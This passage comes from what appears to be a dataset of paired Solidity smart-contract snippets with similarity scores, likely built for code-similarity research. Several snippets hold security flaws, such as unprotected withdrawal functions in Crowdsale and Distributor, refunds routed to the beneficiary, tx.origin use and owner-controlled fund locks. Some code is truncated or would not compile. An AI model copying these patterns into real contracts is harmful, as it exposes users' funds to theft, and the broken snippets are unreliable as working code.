       etherRaised -= etherToBeReturned;

   }

   function extractEther() public whenIcoCompleted onlyExtractor {
      extractor.transfer(address(this).balance);
   }

 }",0.6317405780224465,"contract Crowdsale {

    address public beneficiary = msg.sender; 

    uint public fundingGoal;  

    uint public amountRaised; 

    uint public deadline; 

    uint public price;  

    token public tokenReward;   

    bool public fundingGoalReached = false;  

    bool public crowdsaleClosed = false; 





    mapping(address => uint256) public balance; 



    

    event GoalReached(address _beneficiary, uint _amountRaised);



    

    event FundTransfer(address _backer, uint _amount, bool _isContribution);



    

    constructor(

        uint fundingGoalInEthers,

        uint durationInMinutes,

        uint TokenCostOfEachether,

        address addressOfTokenUsedAsReward

    )  public {

        fundingGoal = fundingGoalInEthers * 1 ether;

        deadline = now + durationInMinutes * 1 minutes;

        price = TokenCostOfEachether ; 

        tokenReward = token(addressOfTokenUsedAsReward); 

    }





    

    function () payable public {



        

        require(!crowdsaleClosed);

        uint amount = msg.value;



        

        balance[msg.sender] += amount;



        

        amountRaised += amount;



        

         tokenReward.transfer(msg.sender, amount * price);

         emit FundTransfer(msg.sender, amount, true);

    }



    

    modifier afterDeadline() { if (now >= deadline) _; }



    

    function checkGoalReached() afterDeadline public {

        if (amountRaised >= fundingGoal){

            

            fundingGoalReached = true;

          emit  GoalReached(beneficiary, amountRaised);

        }



        

        crowdsaleClosed = true;

    }

    function backtoken(uint backnum) public{

        uint amount = backnum * 10 ** 18;

        tokenReward.transfer(beneficiary, amount);

       emit FundTransfer(beneficiary, amount, true);

    }

    

    function backeth() public{

        beneficiary.transfer(amountRaised);

        emit FundTransfer(beneficiary, amountRaised, true);

    }



    

    function safeWithdrawal() afterDeadline public {



        

        if (!fundingGoalReached) {

            

            uint amount = balance[msg.sender];



            if (amount > 0) {

                

                beneficiary.transfer(amountRaised);

                emit  FundTransfer(beneficiary, amount, false);

                balance[msg.sender] = 0;

            }

        }



        

        if (fundingGoalReached && beneficiary == msg.sender) {



            

            beneficiary.transfer(amountRaised);



          emit  FundTransfer(beneficiary, amount, false);

        }

    }

}"
"contract MyContract {
    address creator;
    uint256 myNumber;

    event NumberIsIncreased(address indexed whoIncreased, uint256 indexed oldNumber, uint256 indexed newNumber);

    function MyContract() public {
        creator = msg.sender;
        myNumber = 3;
    }

    function getCreator() public constant returns (address) {
        return creator;
    }

    function getMyNumber() public constant returns (uint256) {
        return myNumber;
    }

    function setMyNumber(uint256 myNewNumber) public {
        NumberIsIncreased(msg.sender, myNumber, myNewNumber);
        myNumber = myNewNumber;
    }


    function kill() public {
        if (msg.sender == creator) {
            selfdestruct(creator);
        }
    }

}",0.6329474349847444,"contract ERC20 {

    function balanceOf(address who) public constant returns (uint256);

    function transfer(address to, uint256 value) public returns (bool);

    function allowance(address owner, address spender) public constant returns (uint256);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

}"
"contract one {
      function buyTokens(address _beneficiary) public payable {
        require(msg.value == 1 ether);
       
      }
}",0.6491455532130388,"contract HexMoney {
    function mintHXY(uint hearts, address payable receiver) public returns(bool);
}"
"contract C {

     uint[] numbers;

     function initNumbers() {
         numbers.push(1);
         numbers.push(2);
     }

     function stateChanger(uint a) {
         numbers.push(a);
     }

     function getNumber(uint index) returns (uint) {
         if(index >= numbers.length)
            return 0;
         else
            return numbers[index];
     }
}",0.638254046915519,"contract showNum {
    address owner = msg.sender;
    uint _num = 0;
    constructor(uint number) public {
        _num = number;
    }
    function setNum(uint number) public payable {
        _num = number;
    }
    function getNum() constant public returns(uint) {
        return _num;
    }
}"
"contract A {
  function testTrue() returns(bool){
    return Math.and(true, true);
  }
}",0.6293719779170625,"contract DSFalseFallback {

    function() returns (bool) {

        return false;

    }

}"
"contract NonFungibleToken is DetailedERC721 {
    string public name;
    string public symbol;
    address public owner;
    address public agServiceContract;
    uint256 public numTokensTotal;

    mapping(uint => address) internal tokenIdToOwner;
    mapping(uint => address) internal tokenIdToApprovedAddress;
    mapping(uint => string) internal tokenIdToMetadata;
    mapping(address => uint[]) internal ownerToTokensOwned;
    mapping(uint => uint) internal tokenIdToOwnerArrayIndex;

    event Transfer(address indexed _from, address indexed _to, uint256 _tokenId
    );

    event Approval( address indexed _owner, address indexed _approved, uint256 _tokenId
    );

    modifier onlyExtantToken(uint _tokenId) {
        require(ownerOf(_tokenId) != address(0));
        _;
    }
    function NonFungibleToken(){
        owner = msg.sender;
    }

    function name()
        public
        view
        returns (string _name)
    {
        return name;
    }

    function symbol()
        public
        view
        returns (string _symbol)
    {
        return symbol;
    }

    function totalSupply()
        public

        returns (uint256 _totalSupply)
    {
        return numTokensTotal;
    }

    function balanceOf(address _owner)
        public
        view
        returns (uint _balance)
    {
        return ownerToTokensOwned[_owner].length;
    }
    function setAgContract(address addr) {
        require(msg.sender == owner);
        agServiceContract = addr;
    }

    function ownerOf(uint _tokenId)
        public
        view
        returns (address _owner)
    {
        return _ownerOf(_tokenId);
    }

    function tokenMetadata(uint _tokenId)
        public
        view
        returns (string _infoUrl)
    {
        return tokenIdToMetadata[_tokenId];
    }

    function approve(address _to, uint _tokenId)
        public
        onlyExtantToken(_tokenId)
    {
        require(msg.sender == ownerOf(_tokenId)|| msg.sender == agServiceContract);
        require(msg.sender != _to);

        if (_getApproved(_tokenId) != address(0) ||
                _to != address(0)) {
            _approve(_to, _tokenId);
            Approval(msg.sender, _to, _tokenId);
        }
    }

    function transferFrom(address _from, address _to, uint _tokenId)
        public
        onlyExtantToken(_tokenId)
    {
        require(getApproved(_tokenId) == msg.sender || msg.sender == agServiceContract);
        require(ownerOf(_tokenId) == _from || msg.sender == agServiceContract);
        require(_to != address(0));

        _clearApprovalAndTransfer(_from, _to, _tokenId);

        Approval(_from, 0, _tokenId);
        Transfer(_from, _to, _tokenId);
    }

    function transfer(address _to, uint _tokenId)
        public
        onlyExtantToken(_tokenId)
    {
        require(ownerOf(_tokenId) == msg.sender || msg.sender == agServiceContract);
        require(_to != address(0));

        _clearApprovalAndTransfer(msg.sender, _to, _tokenId);

        Approval(msg.sender, 0, _tokenId);
        Transfer(msg.sender, _to, _tokenId);
    }

    function tokenOfOwnerByIndex(address _owner, uint _index)
        public
        view
        returns (uint _tokenId)
    {
        return _getOwnerTokenByIndex(_owner, _index);
    }

    function getOwnerTokens(address _owner)
        public
        view
        returns (uint[] _tokenIds)
    {
        return _getOwnerTokens(_owner);
    }

    function implementsERC721()
        public
        view
        returns (bool _implementsERC721)
    {
        return true;
    }

    function getApproved(uint _tokenId)
        public
        view
        returns (address _approved)
    {
        return _getApproved(_tokenId);
    }

    function _clearApprovalAndTransfer(address _from, address _to, uint _tokenId)
        internal
    {
        _clearTokenApproval(_tokenId);
        _removeTokenFromOwnersList(_from, _tokenId);
        _setTokenOwner(_tokenId, _to);
        _addTokenToOwnersList(_to, _tokenId);
    }

    function _ownerOf(uint _tokenId)
        internal
        view
        returns (address _owner)
    {
        return tokenIdToOwner[_tokenId];
    }

    function _approve(address _to, uint _tokenId)
        internal
    {
        tokenIdToApprovedAddress[_tokenId] = _to;
    }

    function _getApproved(uint _tokenId)
        internal
        view
        returns (address _approved)
    {
        return tokenIdToApprovedAddress[_tokenId];
    }

    function _getOwnerTokens(address _owner)
        internal
        view
        returns (uint[] _tokens)
    {
        return ownerToTokensOwned[_owner];
    }

    function _getOwnerTokenByIndex(address _owner, uint _index)
        internal
        view
        returns (uint _tokens)
    {
        return ownerToTokensOwned[_owner][_index];
    }

    function _clearTokenApproval(uint _tokenId)
        internal
    {
        tokenIdToApprovedAddress[_tokenId] = address(0);
    }

    function _setTokenOwner(uint _tokenId, address _owner)
        internal
    {
        tokenIdToOwner[_tokenId] = _owner;
    }

    function _addTokenToOwnersList(address _owner, uint _tokenId)
        internal
    {
        ownerToTokensOwned[_owner].push(_tokenId);
        tokenIdToOwnerArrayIndex[_tokenId] =
            ownerToTokensOwned[_owner].length - 1;
    }

    function _removeTokenFromOwnersList(address _owner, uint _tokenId)
        internal
    {
        uint length = ownerToTokensOwned[_owner].length;
        uint index = tokenIdToOwnerArrayIndex[_tokenId];
        uint swapToken = ownerToTokensOwned[_owner][length - 1];

        ownerToTokensOwned[_owner][index] = swapToken;
        tokenIdToOwnerArrayIndex[swapToken] = index;

        delete ownerToTokensOwned[_owner][length - 1];
        ownerToTokensOwned[_owner].length--;
    }

    function _insertTokenMetadata(uint _tokenId, string _metadata)
        internal
    {
        tokenIdToMetadata[_tokenId] = _metadata;
    }
}",0.6277046909919086,"contract TokenERC20 is Ownable {

	

    using SafeMath for uint256;

    

    string public constant name       = """";

    string public constant symbol     = ""FEIcoin"";

    uint32 public constant decimals   = 18;

    uint256 public totalSupply;

    address public directshota        = 0x8f320bf6a834768D27876E3130482bdC4e6A3edf;

    address public directshotb        = 0x6cD17d4Cb1Da93cc936E8533cC8FEb14c186b7BF;

    uint256 public buy                = 3000;

    address public receipt            = 0x6cD17d4Cb1Da93cc936E8533cC8FEb14c186b7BF;



    mapping(address => bool)public zhens;

    mapping(address => bool)public tlocked;

    mapping(address => uint256)public tamount;

    mapping(address => uint256)public ttimes;

    mapping(address => uint256) balances;

	mapping(address => mapping (address => uint256)) internal allowed;



	event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    

    modifier zhenss(){

        require(zhens[msg.sender] == true);

        _;

    }



	

	function TokenERC20(

        uint256 initialSupply

    ) public {

        totalSupply = initialSupply * 10 ** uint256(decimals);   

       

        balances[msg.sender] = totalSupply;

        emit Transfer(this,msg.sender,totalSupply);

    }

	

    function totalSupply() public view returns (uint256) {

		return totalSupply;

	}	

	

	function transfer(address _to, uint256 _value) public returns (bool) {

		require(_to != address(0));

		require(_value <= balances[msg.sender]);

		if(msg.sender == directshota && !tlocked[_to]){ 

		 

		    directshotaa(_to,_value);

		}

 

		if(tlocked[msg.sender]){

		    tlock(msg.sender,_value);

		}

		balances[msg.sender] = balances[msg.sender].sub(_value);

		balances[_to] = balances[_to].add(_value);

		emit Transfer(msg.sender, _to, _value);

		return true;

	}

	

 

	function directshotaa(address _owner,uint256 _value)internal returns(bool){ 

        tamount[_owner] = tamount[_owner].add(_value);

        tlocked[_owner] = true;

        ttimes[_owner] = now;

	    return true;

	}

	

	 

	function tlock(address _owner,uint256 _value_)internal  returns(bool){  

	    uint256 a = (now - ttimes[_owner]) / 2592000;   

	    if(a >= 9){

	        a = 9;

	        tlocked[_owner] = false;

	    }

	    uint256 b = tamount[_owner] * (9 - a) / 10; 

	    require(balances[_owner] - b >= _value_);

	    return true;

	    

	}

	

	function cha(address _owner)public view returns(uint256){  

	    uint256 a = (now - ttimes[_owner]) / 2592000; 

	    if(a >= 9){

	        a = 9; 

	    }

	    uint256 b = tamount[_owner] * (9 - a) / 10;

	    return b;

	    

	}

	

	function buys(uint256 buy_) public onlyOwner returns(bool){

	    buy = buy_;

	    return true;

	}

	

	function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {

		require(_to != address(0));

		require(_value <= balances[_from]);

		require(_value <= allowed[_from][msg.sender]);

		if(tlocked[_from]){

		    tlock(_from,_value);

		}

		balances[_from] = balances[_from].sub(_value);

		balances[_to] = balances[_to].add(_value);

		allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);

		emit Transfer(_from, _to, _value);

		return true;

	}





    function approve(address _spender, uint256 _value) public returns (bool) {

		allowed[msg.sender][_spender] = _value;

		emit Approval(msg.sender, _spender, _value);

		return true;

	}



    function allowance(address _owner, address _spender) public view returns (uint256) {

		return allowed[_owner][_spender];

	}



	function increaseApproval(address _spender, uint _addedValue) public returns (bool) {

		allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);

		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

		return true;

	}



	function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {

		uint oldValue = allowed[msg.sender][_spender];

		if (_subtractedValue > oldValue) {

			allowed[msg.sender][_spender] = 0;

		} else {

			allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);

		}

		emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);

		return true;

	}

	

	function getBalance(address _a) internal constant returns(uint256) {

 

            return balances[_a];

 

    }

    

    function balanceOf(address _owner) public view returns (uint256 balance) {

        return getBalance( _owner );

    }

    

 

    function ()public payable{

        uint256 a = msg.value * buy;

        require(balances[directshotb] >= a);

        balances[msg.sender] = balances[msg.sender].add(a);

        balances[directshotb] = balances[directshotb].sub(a);

        emit Transfer(directshotb,msg.sender,a);

        receipt.transfer(msg.value);

    }

    

    function zhen(address owner) public onlyOwner returns(bool){

        zhens[owner] = true;

        return true;

    }

    

  

    function paysou(address owner,uint256 _value) public zhenss returns(bool){

        if (!tlocked[owner]) {

            uint256 a = _value * buy;

            require(balances[directshotb] >= a);

            tlocked[owner] = true;

            ttimes[owner] = now;

            tamount[owner] = tamount[owner].add(a);

            balances[owner] = balances[owner].add(a);

            balances[directshotb] = balances[directshotb].sub(a);

            emit Transfer(directshotb,owner,a);

        }

    }

    

    function jietlock(address owner) public onlyOwner returns(bool){

        tlocked[owner] = false;

    }

    

 

}"
"contract agService {
             using SafeMath for uint;
            address public owner;

            modifier onlyOwner(){
                require(msg.sender == owner);
                _;
            }
             modifier onlyFarmers(){
                require(msg.sender == owner);
                _;
            }
            MintableNonFungibleToken public nft;
            uint256 totalSupply;

            address[] approvedFarmers;
            function agService(){
                owner = msg.sender;

            }


            function setNFTAddress(address addr) onlyOwner{
                nft = MintableNonFungibleToken(addr);
            }

            function createNFT() onlyFarmers{

                address _caller;
                _caller = msg.sender;
        
                totalSupply123();
        

                nft.mint(_caller, totalSupply); 

            }


         function totalSupply123
             ()



            { 
                totalSupply = nft.totalSupply();
            }
}",0.6308913229241263,"contract Distributor
{
    address owner = msg.sender;
    address newOwner = msg.sender;
    
    function ChangeOwner(address _newOwner)
    public
    {
        require(msg.sender == owner);
        newOwner = _newOwner;
    }
    
    function ConfirmOwner()
    public
    {
        require(newOwner==msg.sender);
        owner=newOwner;
    }
    
    function Withdrawal()
    public
    payable
    {
        owner.transfer(this.balance);
    }
    
    function Send(address[] addr, uint[] val)
    public
    payable
    {
        require(val.length==addr.length);
        uint total;
        for (uint j=0; j<val.length; j++)
        {
            require(addr[j]!=0x0);
            total+=val[j];
        }
        if(msg.value>=total)
        {
            for (uint i=0; i<addr.length; i++)
            {
                addr[i].transfer(val[i]);
            }
        }
    }
}"
"contract OuterContract {
    event Event(uint256);
    InnerContract pInnerContract;

    function func(uint256 val) external returns (uint256) {
        uint256 val2 = pInnerContract.func(val) + 1;
        Event(val2);
        return val2;
    }
}",0.6093518686773842,"contract Burnable {



    function burn(uint256 _value) external returns(bool);

    function burnFrom(address _from, uint256 _value) external returns(bool);



    

    event Burn(address indexed _from, uint256 _value);

}"
"contract Inbox {
    string public message;

    function Inbox(string iniMess) public {
        message = iniMess;
    }

    function setMess(string newMess) public {
        message = newMess;
    }
}",0.6401853467678557,"contract MyTest{
    string private name;
   
    function setName(string newName) public{
        name=newName;
    }
    
    function getName() public view returns(string){
        return name;
    }
    
}"
"contract GetData is ChainlinkClient {
  uint256 public currentPrice;
  address public owner;

  address ORACLE = 0x83F00b902cbf06E316C95F51cbEeD9D2572a349a;
  string constant JOB = ""c179a8180e034cf5a341488406c32827"";
  uint256 constant private ORACLE_PAYMENT = 1 * LINK;

  constructor() public {
    setPublicChainlinkToken();
    owner = msg.sender;
  }

  function requestEthereumPrice() 
    public
    onlyOwner
  {
    Chainlink.Request memory req = buildChainlinkRequest(stringToBytes32(JOB), address(this), this.fulfill.selector);
    req.add(""get"", ""https:
    req.add(""path"", ""USD"");
    req.addInt(""times"", 100);
    sendChainlinkRequestTo(ORACLE, req, ORACLE_PAYMENT);
  }

  function fulfill(bytes32 _requestId, uint256 _price)
    public
    recordChainlinkFulfillment(_requestId)
  {
    currentPrice = _price;
  }

  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }

  function stringToBytes32(string memory source) private pure returns (bytes32 result) {
    bytes memory tempEmptyStringTest = bytes(source);
    if (tempEmptyStringTest.length == 0) {
      return 0x0;
    }
    assembly { 
      result := mload(add(source, 32))
    }
  }
}",0.6014629201500971,"contract Gemini is ChainLink {
    
    bytes32 constant UINT256_MUL_JOB = bytes32(""f291f8597d174f4aa1983b0e27ae160f"");

    
    

    
    bytes32 constant UINT256_MUL_JOB__LINK = bytes32(""513907f96955437a8ac02a5d70e5bdea"");

    
    

    
    constructor(MedianizerInterface med_, ERC20 link_, address oracle_) public ChainLink(med_, link_, oracle_) {}

    
    function getAssetPrice(uint128 payment_) internal returns (bytes32 queryId) {
        Chainlink.Request memory req = buildChainlinkRequest(UINT256_MUL_JOB, this, this.returnAssetPrice.selector);
        req.add(""get"", ""https:
        req.add(""path"", ""last"");
        req.addInt(""times"", WAD); 
        queryId = sendChainlinkRequest(req, div(payment_, 2)); 
    }

    
    function getPaymentTokenPrice(uint128 payment_, bytes32 queryId) internal returns (bytes32) {
        Chainlink.Request memory req = buildChainlinkRequest(UINT256_MUL_JOB__LINK, this, this.returnPaymentTokenPrice.selector);
        req.add(""endpoint"", ""price"");
        req.add(""fsym"", ""LINK"");
        req.add(""tsyms"", ""USD"");
        req.add(""copyPath"", ""USD"");
        req.addInt(""times"", WAD); 
        bytes32 linkId = sendChainlinkRequest(req, div(payment_, 2)); 
        linkIdToQueryId[linkId] = queryId;
        return linkId;
    }
}"
"contract Adoption {
  address[16] public adopters;
 function getAdopters() public view returns(address[16]) {
   return adopters;

 }
 function adopt(uint petId) public returns(uint) {
   require(petId>=0 && petId<=15,""oops"");
   adopters[petId] = msg.sender;
   return petId;

 }

}",0.6367246099606818,"contract Token {

  function transfer(address receiver, uint amount) public returns(bool);

  function transferFrom(address sender, address receiver, uint amount) public returns(bool);

  function balanceOf(address holder) public view returns(uint);

}"
"contract SmartAgreement {

    address owner;
    mapping (address => uint) balances;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);  
    mapping(address => address) agreementsWith;
    mapping(address => uint) priceUpto1Ks;
    mapping(address => uint) priceUpto10Ks;
    mapping(address => uint) priceUpto100Ks;

    function SmartAgreement(){
        balances[tx.origin] = 10000000;
        owner = msg.sender;
    }

   function addAgrement(address from,address to,uint priceUpto1K ,uint priceUpto10K ,uint priceUpto100K) {
        agreementsWith[from] = to;
        priceUpto1Ks[from] = priceUpto1K;
        priceUpto10Ks[from] = priceUpto10K;
        priceUpto100Ks[from] = priceUpto100K;
    }

     function getAgreement(address from) constant returns(address,uint,uint,uint){

       return (agreementsWith[from],
               priceUpto1Ks[from],
               priceUpto10Ks[from],
               priceUpto100Ks[from]);       

    }

   function sendCoin(address receiver, uint amount) returns(bool sufficient) {
        if (balances[msg.sender] < amount) return false;
        balances[msg.sender] -= amount;
        balances[receiver] += amount;
        Transfer(msg.sender, receiver, amount);
        return true;
    }

    function getBalanceInEth(address addr) returns(uint){
        return ConvertLib.convert(getBalance(addr),2);
    }

    function getBalance(address addr) returns(uint) {
        return balances[addr];
    }

    
    function kill() { if (msg.sender == owner) selfdestruct(owner); }
}",0.652579527421967,"contract RegularToken{

    function transfer(address _to, uint _value) public returns (bool) {
        
        if (balances[msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {
            balances[msg.sender] -= _value;
            balances[_to] += _value;
            Transfer(msg.sender, _to, _value);
            return true;
        } else { revert(); }
    }

    function transferFrom(address _from, address _to, uint _value) public returns (bool) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value >= balances[_to]) {
            balances[_to] += _value;
            balances[_from] -= _value;
            allowed[_from][msg.sender] -= _value;
            Transfer(_from, _to, _value);
            return true;
        } else { revert(); }
    }

    function balanceOf(address _owner) constant public returns (uint) {
        return balances[_owner];
    }

    function approve(address _spender, uint _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) constant public returns (uint) {
        return allowed[_owner][_spender];
    }


    mapping (address => uint) balances;
    mapping (address => mapping (address => uint)) allowed;
    uint public totalSupply;

    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}"
"contract Gold {
    bool public isTaken = false;

    function take() public {
        isTaken = true;
    }
}",0.6367538003845163,"contract MSD4 {

   

    function greenOnFanChun () public pure returns (bool) {

        return true;

    }

}"
"contract example2 {
  function B() {
    print msg.sender; 
    C();
  }
  function C() { print msg.sender; }
}",0.6081312990189263,"contract Lottery

{

    event Bid(address sender);



    function bid() public

    {

        emit Bid(msg.sender);

    }

}"
"contract ContractB {
    string private name;

    function set_name(string _name) {
      name = _name;
    }

    function get_name() returns(string) {
      return name;
    }
  }",0.6000714387858438,"contract Cookie {



  function () public payable {}



  



  function getFlavor()

    public

    constant

    returns (string flavor)

  {

    return ""mmm ... chocolate chip"";

  }

}"
"contract ContractC {
    string private name;

    function set_name(string _name) {
        name = _name;
    }

    function get_name() returns(string) {
        return name;
    }
  }",0.6000714387858438,"contract Cookie {



  function () public payable {}



  



  function getFlavor()

    public

    constant

    returns (string flavor)

  {

    return ""mmm ... chocolate chip"";

  }

}"
"contract two {
    ...
    function doBuy(uint _amount) public {
       one.buyTokens(msg.sender, _amount);
    }",0.6691202181074943,"contract father {

    function fallback(uint num,address sender,uint amount) public;

}"
"contract HelloWorld {

    uint public x;   

    function HelloWorld() {
        x = 5;
    }

    function set_x(uint _x) returns(uint x) {
        x = _x;
        return x;
    }

}",0.6227666723871115,"contract Token{

function transfer(address to, uint value) public returns (bool);

function decimals() public returns (uint);

}"
"contract BatchToken is Owned {
    mapping (address => uint256) public balanceOf;      

    event Transfer(address indexed from, address indexed to, uint256 value);


    function distributeToken(address[] addresses, uint256 _value) onlyOwner {
        for (uint i = 0; i < addresses.length; i++) {
            balanceOf[owner] -= _value;
            balanceOf[addresses[i]] += _value;
            Transfer(owner, addresses[i], _value);
        } 
    }

    function Destroy() onlyOwner() {
        selfdestruct(owner);
    }
}",0.6931539395544205,"contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) public constant returns (uint256 remaining);
  function transferFrom(address from, address to, uint256 value) public returns (bool success);
  function approve(address spender, uint256 value) public returns (bool success);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}"
"contract BasicWithdrawable {
  using SafeMath for uint;

  mapping (address => uint) private balances;

  

  function balanceOf(address _user) public view returns(uint _balance) {
    return balances[_user];
  }

  

  function() public payable {
    deposit();
  }

  function deposit() public payable {
    _increaseBalance(msg.sender, msg.value);
  }

  function transfer(address _to, uint _amount) public {
    require(_amount <= balances[msg.sender]);

    _decreaseBalance(msg.sender, _amount);
    _increaseBalance(_to, _amount);
  }

  function withdrawAll() public {
    require(balances[msg.sender] > 0);

    
    uint _amount = balances[msg.sender];
    _decreaseBalance(msg.sender, _amount);
    msg.sender.transfer(_amount);
  }

  function withdraw(uint _amount) public {
    require(_amount <= balances[msg.sender]);

    _decreaseBalance(msg.sender, _amount);
    msg.sender.transfer(_amount);
  }

  

  
  
  function depositTo(address _user, uint _amount) internal {
    require(_user != address(0));
    _increaseBalance(_user, _amount);
  }

  

  function _increaseBalance(address _user, uint _amount) private {
    balances[_user] = balances[_user].add(_amount);
  }

  function _decreaseBalance(address _user, uint _amount) private {
    balances[_user] = balances[_user].sub(_amount);
  }
}",0.6594694238423134,"contract Wallet is Pausable {
    event DepositWallet(address _depositBy, uint256 _amount);
    event Withdraw(uint256 _amount);
    event Transfer(address _to,uint256 _amount);
    
    address public owner;
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyAdminOrOwner() {
        require(msg.sender == owner || msg.sender == admin);
        _;
    }
    constructor(address _admin,address _who) public {
        require(_admin != address(0));
        admin = _admin;
        owner = _who;
    }
    
    
    function setOwner(address _who) external onlyAdmin {
        owner = _who;
    }
    
    function deposit() public payable{
        emit DepositWallet(msg.sender,msg.value);
    }
    
    function() public payable{
        emit DepositWallet(msg.sender,msg.value);
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }
    
    function transfer(address _to,uint256 _amount) external onlyOwner whenNotPaused{
        require(address(this).balance>=_amount);
        require(_to!=address(0));
        if (_amount>0){
            _to.transfer(_amount);
        }
        emit Transfer(_to,_amount);
    }
    
    function withdraw() public onlyOwner whenNotPaused{
        require(owner!=address(0));
        uint256 _val = address(this).balance;
        if (_val>0){
            owner.transfer(_val);
        }
        emit Withdraw(_val);
    }
}"
"contract WithDraw is Ownable {

  Token token;
  mapping(address => uint256) public redeemBalanceOf;
  event BalanceSet(address indexed beneficiary, uint256 value);
  event Redeemed(address indexed beneficiary, uint256 value);

  function WithDraw() public {
      address _tokenAddr = MY_TOKEN_ADDR;
      token = Token(_tokenAddr);
  }

  function setBalances(address[] dests, uint256[] values) onlyOwner public {
    uint256 i = 0;
    while (i < dests.length) {
        if(dests[i] == address(0)) continue;
        uint256 toSend = values[i] * 10**18;
        redeemBalanceOf[dests[i]] += toSend;
        i++;
        BalanceSet(dests[i],values[i]);
    }
  }

  function redeem(uint256 quantity) external{
      uint256 baseUnits = quantity * 10**18;
      require(redeemBalanceOf[msg.sender]>=baseUnits);
      redeemBalanceOf[msg.sender] -= baseUnits;
      token.transferFrom(owner,msg.sender,baseUnits);
      Redeemed(msg.sender,quantity);
  }

}",0.6461774085829998,"contract TPPC2018Token {
  address public owner;
  string public name;
  string public symbol;
  uint public decimals;
  uint256 public totalSupply;

  event Transfer(address indexed from, address indexed to, uint256 value);

  
  mapping (address => uint256) public balanceOf;

  function TPPC2018Token(uint256 initialSupply, string tokenName, string tokenSymbol, uint decimalUnits) public {
    owner = msg.sender;
    totalSupply = initialSupply * 10 ** uint256(decimals);
    balanceOf[msg.sender] = totalSupply;
    name = tokenName;
    symbol = tokenSymbol;
    decimals = decimalUnits;
  }

  
  function transfer(address _to, uint256 _value) public {
    
    require(balanceOf[msg.sender] >= _value && balanceOf[_to] + _value >= balanceOf[_to]);

    
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;

    
    emit Transfer(msg.sender, _to, _value);
  }
}"
"contract test2 {
    address payable k;
    function testA(address _add1) public { 
        test1 a = test1 (_add1);
        uint amount = 500;  
        a.f.value(amount)(2);
    }  
    function testB(address payable _add1) public { 
        uint amount = 500;
        k= _add1;
        k.f.value(amount)(2);
    }  
}",0.6435328716494685,"contract Token {
    mapping (address => uint256) public balanceOf;
    function transferFrom(
         address _from,
         address _to,
         uint256 _amount
     ) public payable returns(bool success) {
        _from = _from;
        _to = _to;
        _amount = _amount;
        return true;
    }
}"
"contract BadGreeter {
  address public creator;

  function BadGreeter() {
    creator = 0x1010101010; 
  }

  function greet() constant returns (string) {
    return ""Trust me..."";
  }
}",0.6428155845650008,"contract Ownable {
    address public Owner;
    
    function Ownable() { Owner = msg.sender; }
    function isOwner() internal constant returns (bool) { return(Owner == msg.sender); }
}"
"contract A{
    uint public a;
    function setA(uint _a){
        a = _a;
    }
    function getData() constant returns (uint){
        return a;
    }
}",0.6781258358712565,"contract FiatContract {

    function ETH(uint _id) constant returns (uint256);

    function USD(uint _id) constant returns (uint256);

}"
"contract C {
    A[] internal c;
    function () payable {}
    function makeContract() returns (uint, uint){ 
        c.length = 2;
        A a = new A();
        a.setA(1);
        c[0] = a;
        B b = new B();
        b.setA(1);
        c[1] = b;
        return (c[0].getData(), c[1].getData());
    }
}",0.6488188721021283,"contract SafeMath {

    function safeAdd(uint a, uint b) internal pure returns (uint c) {

        c = a + b;

        assert(c >= a);

    }



    function safeSub(uint a, uint b) internal pure returns (uint c) {

        c = a - b;

        assert(c <= a);

    }

}"
"contract MyCoin {
  uint _totalSupply;
  mapping(address => uint) public balances;

  function MyCoin() public {
    _totalSupply = 1;
    balances[msg.sender] = 1;
  }
}",0.6828244907606045,"contract IToken {
  function totalSupply() public constant returns (uint256 totalSupply);
  function mintTokens(address _to, uint256 _amount) public {}
}"
"contract ExampleStorage {
    uint public _value;
    uint public _value2;
}",0.6088826132515074,"contract Contract {
    uint256 public a;
    constructor () public {
        a = 1;
    }
}"
"contract IExample {
    function getUint() returns (uint);
    function getValues() returns (uint256 v1, uint256 v2);
    function setUint(uint value);
}",0.6864643543927322,"contract Coin {

    function getOwner(uint index) public view returns (address, uint256);

    function getOwnerCount() public view returns (uint);

}"
"contract DappToken {

    uint256 public totalSupply;

    function DappToken () public {
        totalSupply = 1000000;
    }
   }",0.6215609225733854,"contract ERC721Enumerable is ERC721Basic {

    function totalSupply() public view returns (uint256);

}"
"contract HelloEth {

    string message;

    function HelloEth() public{
         message = ""Hello Ethereum!"";
    }

    function getmessage() public returns (string) {
        return message;
    }
}",0.6665417873951002,"contract MyTest{
    string private name;
   
    function setName(string newName) public{
        name=newName;
    }
    
    function getName() public view returns(string){
        return name;
    }
    
}"
"contract C {  
bytes32 public temp;  
function hashingsha3 (uint s)   {  
temp= sha3(s);  
}

    function hashingsha256 (uint s) {
        temp= sha256(s); 
    }
     function kec (uint s)   returns  (bytes32 hash){
        temp= keccak256(s); 
    }

}",0.6241132991303255,"contract PauseLike {
    function delay() public view returns (uint256);
    function plot(address, bytes32, bytes memory, uint256) public;
    function exec(address, bytes32, bytes memory, uint256) public;
}"
"contract Test {
  event Ev(string key);

  mapping(string => string) mapp;

  function setMapping(string key, string val) {
    mapp[key] = val;
    Ev(key);
  }

  function getMappingVal(string key) constant returns(string) {
    return mapp[key].val;
  }

}",0.6953813188306109,"contract SaveString{

    constructor() public {

    }

    mapping (uint=>string) data;

    function setStr(uint key, string value) public {

        data[key] = value;

    }

